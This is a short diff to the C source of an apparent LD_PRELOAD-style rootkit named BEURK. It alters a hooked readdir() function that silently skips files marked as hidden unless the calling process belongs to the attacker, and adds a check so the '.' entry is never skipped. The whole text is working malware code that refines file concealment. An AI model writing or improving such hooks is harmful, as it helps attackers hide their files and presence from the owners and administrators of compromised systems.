@@ -19,6 +19,7 @@
  */
 
 #include <dirent.h> /* struct dirent, DIR */
+#include <string.h> /* strcmp() */
 #include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file() */
 #include "config.h" /* REAL_READDIR() */
 #include "hooks.h" /* prototype */
@@ -33,7 +34,7 @@ struct dirent   *readdir(DIR *dirp) {
     if (is_attacker())
         return (dir);
 
-    while (dir && is_hidden_file(dir->d_name)) {
+    while (dir && strcmp(dir->d_name, ".") && is_hidden_file(dir->d_name)) {
         dir = REAL_READDIR(dirp);
     }
     return (dir);
